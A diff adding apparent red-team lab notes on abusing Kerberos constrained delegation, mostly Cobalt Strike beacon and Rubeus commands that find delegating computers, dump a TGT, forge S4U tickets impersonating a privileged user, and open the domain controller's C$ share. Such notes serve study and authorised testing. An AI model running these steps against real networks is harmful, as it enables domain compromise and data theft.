@@ -99,8 +99,34 @@ Machine TGTs are leveraged slightly differently -- see S4U2Self Abuse later.
 
 ## Constrained Delegation
 
-Constrained delegation is a safer means for services to perform Kerberos delegation. It aims to restrict the services to which the server can act on behalf of a user.  It no longer allows the server to cache the TGTs of other users, but allows it to request a TGS for another user with its own TGT.
+Constrained delegation is a safer means for services to perform Kerberos delegation. It aims to restrict the services to which the server can act on behalf of a user. The server cannot cache the TGTs of other users, but can request a TGS for another user with its own TGT. Search for both user accounts as well as computer accounts doing this.
 
+For example: SQL-2 can act on behalf of any user to the cifs service on DC-2 (CIFS allows you to list file shares and transfer files). To find computers configured for constrained delegation, search for those whose  msds-allowedtodelegateto attribute is not empty: ```execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json```
 
+1: To perform the delegation, get the TGT of the trusted principal; extract it with Rubeus dump:
 
+    beacon> run hostname
+    beacon> getuid
+    beacon> execute-assembly Rubeus.exe triage
+    beacon> execute-assembly Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
 
+2: With the TGT, perform an S4U request to obtain a usable TGS for CIFS on DC-2. Want someone who is local admin on the target or a domain admin. This will perform an S4U2Self first and then an S4U2Proxy:
+
+    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:<user> /msdsspn:<service> user:<delegation> ticket:<user ticket> /nowrap
+
+e.g.:
+
+    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io user:sql-2$ /ticket:doIFLD... /nowrap
+
+3: Use the final S4U2Proxy ticket for a new logon session, e.g.:
+
+    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGa...
+    beacon> steal_token 5540
+    beacon> ls \\dc-2.dev.cyberbotic.io\c$
+
+Rubeus asktgt also works if have NTLM or AES hashes.
+
+Always use the FQDN. Otherwise, there will be 1326 errors:
+
+    beacon> ls \\dc-2\c$
+    [-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE
